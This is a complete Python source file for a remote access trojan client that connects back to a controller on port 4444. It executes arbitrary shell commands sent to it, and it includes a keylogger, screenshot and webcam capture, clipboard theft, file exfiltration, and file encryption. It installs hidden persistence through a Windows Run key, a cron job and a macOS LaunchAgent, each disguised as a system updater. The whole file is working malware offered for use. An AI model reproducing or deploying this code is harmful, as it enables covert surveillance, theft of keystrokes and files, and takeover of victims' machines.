# client.py

import json
import os
import platform
import socket
import subprocess
import time
import uuid
import threading
import sys
from datetime import datetime

# --- Dependencies for features ---
# Ensure these are installed on the client machine:
# pip install mss psutil pynput opencv-python pyperclip cryptography pyautogui

try:
    import mss  # For screenshots
except ImportError:
    print("[-] mss library not found. Screenshot functionality will fail. Run: pip install mss")
    mss = None

try:
    import psutil  # For system info and process monitoring
except ImportError:
    print("[-] psutil library not found. Sysinfo/process functionality may be limited. Run: pip install psutil")
    psutil = None

try:
    from pynput import keyboard  # For keylogger
except ImportError:
    print("[-] pynput library not found. Keylogger functionality will fail. Run: pip install pynput")
    keyboard = None

try:
    import cv2  # For webcam capture
except ImportError:
    print("[-] opencv-python library not found. Webcam functionality will fail. Run: pip install opencv-python")
    cv2 = None

try:
    import pyperclip  # For clipboard access
except ImportError:
    print("[-] pyperclip library not found. Clipboard functionality will fail. Run: pip install pyperclip")
    pyperclip = None

try:
    from cryptography.fernet import Fernet  # For stronger encryption
except ImportError:
    print("[-] cryptography library not found. Encryption will fail. Run: pip install cryptography")
    Fernet = None

try:
    import pyautogui  # For screen locking and message pop-ups
except ImportError:
    print("[-] pyautogui library not found. Screen lock/message functionality will fail. Run: pip install pyautogui")
    pyautogui = None

try:
    import webbrowser  # For opening URLs
except ImportError:
    print("[-] webbrowser library not found. URL opening functionality will fail (should be standard).")
    webbrowser = None

if platform.system() == "Windows":
    try:
        import winreg  # For persistence
    except ImportError:
        print("[-] winreg library not found (should be standard on Windows). Persistence may fail.")
        winreg = None
else:
    winreg = None

# --- Encryption Settings ---
# REPLACE WITH A VALID FERNET KEY (32 url-safe base64-encoded bytes)
# Run: from cryptography.fernet import Fernet; print(Fernet.generate_key())
ENCRYPTION_KEY = b'PpHc4oNDx6mSNPH8IAmMyEHyO_6nvIeyteEemFVGq9s='  # Example: b'4c3b2a1e-...'

if Fernet:
    cipher = Fernet(ENCRYPTION_KEY)
else:
    cipher = None
    print("[-] Fernet cipher not initialized due to missing cryptography library.")

# --- Keylogger Globals ---
keylogger_listener = None
keylog_file_name = "client_keylog.txt"
stop_keylogger_event = threading.Event()

# --- Command Queue for Offline Processing ---
command_queue_file = "command_queue.json"
command_queue = []

# --- Encryption Functions ---
def encrypt_data(data):
    if not cipher:
        print("[-] Encryption unavailable. Data will not be encrypted.")
        return data if isinstance(data, bytes) else data.encode('utf-8')
    try:
        if isinstance(data, dict):
            data = json.dumps(data)
        if isinstance(data, str):
            data = data.encode('utf-8')
        return cipher.encrypt(data)
    except Exception as e:
        print(f"[-] Encryption error: {e}")
        return None

def decrypt_data(encrypted_data):
    if not cipher:
        print("[-] Decryption unavailable. Assuming data is unencrypted.")
        return encrypted_data.decode('utf-8', errors='ignore') if isinstance(encrypted_data, bytes) else encrypted_data
    try:
        decrypted = cipher.decrypt(encrypted_data)
        return decrypted.decode('utf-8')
    except Exception as e:
        print(f"[-] Decryption error: {e}")
        return None

# --- Communication Functions ---
def send_data(data_dict):
    try:
        encrypted_data = encrypt_data(data_dict)
        if encrypted_data:
            sock.send(encrypted_data)
    except Exception as e:
        print(f"[-] Error sending data: {e}")

def recv_data():
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                return None
            decrypted_data = decrypt_data(chunk)
            if decrypted_data:
                try:
                    return json.loads(decrypted_data)
                except json.JSONDecodeError:
                    continue  # Accumulate more data if JSON is incomplete
            return None
    except Exception as e:
        print(f"[-] Recv_data error: {e}")
        return None

# --- Command Queue Functions ---
def save_command_queue():
    try:
        with open(command_queue_file, 'w') as f:
            json.dump(command_queue, f)
    except Exception as e:
        print(f"[-] Error saving command queue: {e}")

def load_command_queue():
    global command_queue
    if os.path.exists(command_queue_file):
        try:
            with open(command_queue_file, 'r') as f:
                command_queue = json.load(f)
        except Exception as e:
            print(f"[-] Error loading command queue: {e}")
            command_queue = []

def process_queued_commands():
    global command_queue
    if not command_queue:
        return
    for cmd in command_queue[:]:  # Copy to avoid modifying during iteration
        execute_command(cmd)
        command_queue.remove(cmd)
    save_command_queue()

def view_command_queue():
    try:
        send_data({"type": "command_queue", "data": command_queue})
    except Exception as e:
        send_data({"status": "error", "message": f"Failed to view command queue: {str(e)}"})

def clear_command_queue():
    global command_queue
    try:
        command_queue = []
        if os.path.exists(command_queue_file):
            os.remove(command_queue_file)
        send_data({"status": "success", "message": "Command queue cleared."})
    except Exception as e:
        send_data({"status": "error", "message": f"Failed to clear command queue: {str(e)}"})

# --- File Transfer Functions ---
def download_file(file_name_to_save):
    try:
        metadata = recv_data()
        if not metadata or 'file_size_for_upload' not in metadata:
            send_data({"status": "error", "message": "Missing file metadata for client download"})
            return

        encrypted_size = metadata['file_size_for_upload']
        with open(file_name_to_save, 'wb') as f:
            received_encrypted_bytes = b''
            while len(received_encrypted_bytes) < encrypted_size:
                chunk = sock.recv(min(4096, encrypted_size - len(received_encrypted_bytes)))
                if not chunk:
                    send_data({"status": "error", "message": "Connection lost during client download"})
                    return
                received_encrypted_bytes += chunk

            decrypted_data = decrypt_data(received_encrypted_bytes)
            if decrypted_data:
                f.write(decrypted_data.encode('utf-8') if isinstance(decrypted_data, str) else decrypted_data)
                send_data({"status": "success", "message": f"File {file_name_to_save} downloaded."})
    except Exception as e:
        print(f"[!] Error in client download_file: {e}")
        send_data({"status": "error", "message": f"Client download_file exception: {str(e)}"})

def upload_file(file_name_to_send):
    try:
        if not os.path.exists(file_name_to_send):
            send_data({"status": "error", "message": f"File {file_name_to_send} not found on client."})
            return

        with open(file_name_to_send, 'rb') as f:
            data = f.read()

        encrypted_data = encrypt_data(data)
        if encrypted_data:
            send_data({'file_size_for_download': len(encrypted_data)})
            sock.sendall(encrypted_data)
    except Exception as e:
        print(f"[!] Error in client upload_file: {e}")
        send_data({"status": "error", "message": f"Client upload_file exception: {str(e)}"})

# --- Feature Functions ---
def get_initial_info():
    hostname = socket.gethostname()
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
    username = os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown"
    return f"{hostname},{mac_address},{username}"

def take_screenshot():
    if not mss:
        send_data({"status": "error", "message": "MSS library not available for screenshots."})
        return
    temp_screenshot_file = "temp_client_sc.png"
    try:
        with mss.mss() as sct:
            sct.shot(output=temp_screenshot_file)
        upload_file(temp_screenshot_file)
        os.remove(temp_screenshot_file)
    except Exception as e:
        send_data({"status": "error", "message": f"Screenshot failed: {str(e)}"})

def capture_webcam():
    if not cv2:
        send_data({"status": "error", "message": "OpenCV library not available for webcam capture."})
        return
    temp_webcam_file = "temp_webcam.jpg"
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            send_data({"status": "error", "message": "No webcam detected or access denied."})
            return
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(temp_webcam_file, frame)
            upload_file(temp_webcam_file)
            os.remove(temp_webcam_file)
        else:
            send_data({"status": "error", "message": "Failed to capture webcam image."})
        cap.release()
    except Exception as e:
        send_data({"status": "error", "message": f"Webcam capture failed: {str(e)}"})

def get_process_list():
    if not psutil:
        send_data({"status": "error", "message": "psutil library not available for process listing."})
        return
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'username': proc.info['username'] or "N/A"
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        send_data({"type": "process_list", "data": processes})
    except Exception as e:
        send_data({"status": "error", "message": f"Process listing failed: {str(e)}"})

def kill_process(pid):
    if not psutil:
        send_data({"status": "error", "message": "psutil library not available for process killing."})
        return
    try:
        proc = psutil.Process(int(pid))
        proc.terminate()
        send_data({"status": "success", "message": f"Process {pid} terminated."})
    except psutil.NoSuchProcess:
        send_data({"status": "error", "message": f"Process {pid} not found."})
    except Exception as e:
        send_data({"status": "error", "message": f"Failed to kill process {pid}: {str(e)}"})

def get_clipboard():
    if not pyperclip:
        send_data({"status": "error", "message": "pyperclip library not available for clipboard access."})
        return
    try:
        content = pyperclip.paste()
        send_data({"type": "clipboard_content", "data": content})
    except Exception as e:
        send_data({"status": "error", "message": f"Clipboard access failed: {str(e)}"})

def set_clipboard(content):
    if not pyperclip:
        send_data({"status": "error", "message": "pyperclip library not available for clipboard modification."})
        return
    try:
        pyperclip.copy(content)
        send_data({"status": "success", "message": "Clipboard content updated."})
    except Exception as e:
        send_data({"status": "error", "message": f"Clipboard modification failed: {str(e)}"})

def encrypt_file(file_path):
    if not cipher:
        send_data({"status": "error", "message": "Cryptography library not available for file encryption."})
        return
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = cipher.encrypt(data)
        with open(file_path + ".encrypted", 'wb') as f:
            f.write(encrypted_data)
        send_data({"status": "success", "message": f"File {file_path} encrypted as {file_path}.encrypted"})
    except Exception as e:
        send_data({"status": "error", "message": f"File encryption failed: {str(e)}"})

def decrypt_file(file_path):
    if not cipher:
        send_data({"status": "error", "message": "Cryptography library not available for file decryption."})
        return
    try:
        with open(file_path, 'rb') as f:
            encrypted_data = f.read()
        decrypted_data = cipher.decrypt(encrypted_data)
        original_path = file_path.replace(".encrypted", "")
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        send_data({"status": "success", "message": f"File {file_path} decrypted to {original_path}"})
    except Exception as e:
        send_data({"status": "error", "message": f"File decryption failed: {str(e)}"})

def gather_detailed_sysinfo():
    info = {}
    try:
        info['platform_system'] = platform.system()
        info['platform_release'] = platform.release()
        info['platform_version'] = platform.version()
        info['architecture'] = platform.machine()
        info['hostname'] = socket.gethostname()
        try:
            info['internal_ip'] = socket.gethostbyname(socket.gethostname())
        except socket.gaierror:
            info['internal_ip'] = "N/A"
        info['mac_address'] = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
        info['processor'] = platform.processor()
        info['python_version'] = platform.python_version()
        info['user'] = os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown"

        if psutil:
            vm = psutil.virtual_memory()
            info['ram_total_gb'] = f"{vm.total / (1024**3):.2f} GB"
            info['ram_available_gb'] = f"{vm.available / (1024**3):.2f} GB"
            info['ram_used_percentage'] = f"{vm.percent}%"
            disk_usage = psutil.disk_usage('/')
            info['disk_total_gb'] = f"{disk_usage.total / (1024**3):.2f} GB"
            info['disk_used_gb'] = f"{disk_usage.used / (1024**3):.2f} GB"
            info['disk_free_gb'] = f"{disk_usage.free / (1024**3):.2f} GB"
            info['disk_used_percentage'] = f"{disk_usage.percent}%"
            info['cpu_logical_cores'] = psutil.cpu_count(logical=True)
            info['cpu_physical_cores'] = psutil.cpu_count(logical=False)
            info['cpu_total_usage_momentary'] = f"{psutil.cpu_percent(interval=0.1)}%"
        else:
            info['psutil_status'] = "psutil library not available."
        send_data({"type": "sysinfo_result", "data": info})
    except Exception as e:
        send_data({"type": "sysinfo_result", "error": str(e)})

def lock_screen():
    if not pyautogui:
        send_data({"status": "error", "message": "pyautogui library not available for screen locking."})
        return
    try:
        if platform.system() == "Windows":
            subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], check=True)
        elif platform.system() == "Linux":
            subprocess.run(["xdg-screensaver", "lock"], check=True)
        elif platform.system() == "Darwin":  # macOS
            subprocess.run(["pmset", "displaysleepnow"], check=True)
        else:
            send_data({"status": "error", "message": "Screen locking not supported on this platform."})
            return
        send_data({"status": "success", "message": "Screen locked successfully."})
    except Exception as e:
        send_data({"status": "error", "message": f"Screen locking failed: {str(e)}"})

def send_message(message):
    if not pyautogui:
        send_data({"status": "error", "message": "pyautogui library not available for displaying messages."})
        return
    try:
        pyautogui.alert(text=message, title="System Notification", button="OK")
        send_data({"status": "success", "message": f"Message displayed: {message}"})
    except Exception as e:
        send_data({"status": "error", "message": f"Message display failed: {str(e)}"})

def open_url(url):
    if not webbrowser:
        send_data({"status": "error", "message": "webbrowser library not available for opening URLs."})
        return
    try:
        webbrowser.open(url)
        send_data({"status": "success", "message": f"URL opened: {url}"})
    except Exception as e:
        send_data({"status": "error", "message": f"URL opening failed: {str(e)}"})

def get_network_info():
    if not psutil:
        send_data({"status": "error", "message": "psutil library not available for network information."})
        return
    try:
        network_info = {}
        interfaces = psutil.net_if_addrs()
        for interface, addrs in interfaces.items():
            network_info[interface] = []
            for addr in addrs:
                network_info[interface].append({
                    'address': addr.address,
                    'netmask': addr.netmask,
                    'family': str(addr.family)
                })
        send_data({"type": "network_info", "data": network_info})
    except Exception as e:
        send_data({"status": "error", "message": f"Network info retrieval failed: {str(e)}"})

def on_press(key):
    if stop_keylogger_event.is_set():
        return False
    try:
        with open(keylog_file_name, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(keylog_file_name, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("[ENTER]\n")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.tab:
                f.write("[TAB]")
            else:
                f.write(f" [{str(key)}] ")

def keylogger_thread_func():
    global keylogger_listener
    if not keyboard:
        print("[-] Keylogger cannot start: pynput.keyboard not available.")
        return
    with open(keylog_file_name, "w") as f:
        f.write(f"Keylogger started at {time.asctime()}\n")
    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()
    keylogger_listener.join()
    with open(keylog_file_name, "a") as f:
        f.write(f"\nKeylogger stopped at {time.asctime()}\n")
    print("Keylogger listener thread finished.")

def start_keylogger():
    global keylogger_listener, stop_keylogger_event
    if keylogger_listener and keylogger_listener.is_alive():
        send_data({"status": "info", "message": "Keylogger is already running."})
        return
    if not keyboard:
        send_data({"status": "error", "message": "pynput library not available for keylogger."})
        return
    stop_keylogger_event.clear()
    thread = threading.Thread(target=keylogger_thread_func, daemon=True)
    thread.start()
    send_data({"status": "success", "message": "Keylogger started."})

def stop_keylogger():
    global keylogger_listener
    if not (keylogger_listener and keylogger_listener.is_alive()):
        send_data({"status": "info", "message": "Keylogger is not running or already stopped."})
        return
    stop_keylogger_event.set()
    if hasattr(keylogger_listener, 'stop'):
        keylogger_listener.stop()
    keylogger_listener = None
    send_data({"status": "success", "message": "Keylogger stop signal sent."})

def send_keylogs():
    if not os.path.exists(keylog_file_name):
        send_data({"status": "error", "message": "Keylog file not found."})
        return
    upload_file(keylog_file_name)

def establish_persistence():
    try:
        if platform.system() == "Windows" and winreg:
            if hasattr(sys, 'frozen'):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            app_name = "WindowsSystemUpdater"
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(reg_key)
            send_data({"status": "success", "message": f"Persistence established via HKCU Run key as '{app_name}'."})
        elif platform.system() == "Linux":
            cron_job = f"* * * * * {sys.executable} {os.path.abspath(__file__)} &"
            subprocess.run(['crontab', '-l'], capture_output=True, text=True, check=False)
            with open('/tmp/cron_temp', 'w') as f:
                f.write(cron_job + '\n')
            subprocess.run(['crontab', '/tmp/cron_temp'], check=True)
            os.remove('/tmp/cron_temp')
            send_data({"status": "success", "message": "Persistence established via crontab."})
        elif platform.system() == "Darwin":  # macOS
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.updater.plist")
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            subprocess.run(['launchctl', 'load', plist_path], check=True)
            send_data({"status": "success", "message": "Persistence established via LaunchAgent."})
        else:
            send_data({"status": "error", "message": "Persistence not supported on this platform."})
    except Exception as e:
        send_data({"status": "error", "message": f"Failed to establish persistence: {str(e)}"})

# --- Command Execution ---
def execute_command(command_data):
    command = command_data.get('cmd', '').strip()
    args = command_data.get('args', '')
    
    if command == 'q':
        return
    elif command == 'kill_client':
        send_data({"status": "info", "message": "Client received kill_client command. Terminating."})
        sock.close()
        return True
    elif command == 'upload':
        if args:
            download_file(args)
        else:
            send_data({"status": "error", "message": "Upload command received without filename."})
    elif command == 'download':
        if args:
            upload_file(args)
        else:
            send_data({"status": "error", "message": "Download command received without filename."})
    elif command == 'cd':
        path = args or ".."
        try:
            os.chdir(path)
            send_data({"type": "cmd_result", "output": f"Current directory changed to: {os.getcwd()}"})
        except Exception as e:
            send_data({"type": "cmd_result", "output": f"Error changing directory: {str(e)}"})
    elif command == 'screenshot':
        take_screenshot()
    elif command == 'webcam':
        capture_webcam()
    elif command == 'sysinfo':
        gather_detailed_sysinfo()
    elif command == 'process_list':
        get_process_list()
    elif command == 'kill_process':
        if args.isdigit():
            kill_process(args)
        else:
            send_data({"status": "error", "message": "Invalid PID for kill_process command."})
    elif command == 'get_clipboard':
        get_clipboard()
    elif command == 'set_clipboard':
        if args:
            set_clipboard(args)
        else:
            send_data({"status": "error", "message": "No content provided for set_clipboard command."})
    elif command == 'encrypt_file':
        if args:
            encrypt_file(args)
        else:
            send_data({"status": "error", "message": "No file path provided for encrypt_file command."})
    elif command == 'decrypt_file':
        if args:
            decrypt_file(args)
        else:
            send_data({"status": "error", "message": "No file path provided for decrypt_file command."})
    elif command == 'keylog_start':
        start_keylogger()
    elif command == 'keylog_stop':
        stop_keylogger()
    elif command == 'get_keylogs':
        send_keylogs()
    elif command == 'persist':
        establish_persistence()
    elif command == 'lock_screen':
        lock_screen()
    elif command == 'send_message':
        if args:
            send_message(args)
        else:
            send_data({"status": "error", "message": "No message provided for send_message command."})
    elif command == 'open_url':
        if args:
            open_url(args)
        else:
            send_data({"status": "error", "message": "No URL provided for open_url command."})
    elif command == 'get_network_info':
        get_network_info()
    elif command == 'view_queue':
        view_command_queue()
    elif command == 'clear_queue':
        clear_command_queue()
    else:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, errors='replace')
        result = proc.stdout.read() + proc.stderr.read()
        send_data({"type": "cmd_result", "output": result if result else "Command executed (no output)."})

# --- Main Shell Logic ---
def shell_loop(sock_param):
    global sock
    sock = sock_param
    initial_client_data = get_initial_info()
    send_data({"type": "initial_info", "data": initial_client_data})

    # Load and process any queued commands
    load_command_queue()
    process_queued_commands()

    while True:
        try:
            command_data = recv_data()
            if command_data is None:
                print("[-] Connection lost or invalid data received. Queuing commands.")
                if isinstance(command_data, dict):
                    command_queue.append(command_data)
                    save_command_queue()
                break
            if not isinstance(command_data, dict) or 'cmd' not in command_data:
                continue
            if execute_command(command_data):
                return True  # Exit on kill_client
        except Exception as e:
            print(f"[!] Error in client shell_loop: {e}")
            break
    return False

# --- Main Connection Loop ---
if __name__ == '__main__':
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_ip = '127.0.0.1'
            server_port = 4444
            sock.connect((server_ip, server_port))
            print(f"[+] Connected to server {server_ip}:{server_port}")
            should_exit_program = shell_loop(sock)
            if should_exit_program:
                print("[-] Exiting client program as per server command.")
                break
            sock.close()
        except socket.error as e:
            print(f"[-] Socket error: {e}. Retrying in 5 seconds...")
        except Exception as e:
            print(f"[!] Unhandled error in main loop: {e}. Retrying in 5 seconds...")
        time.sleep(5)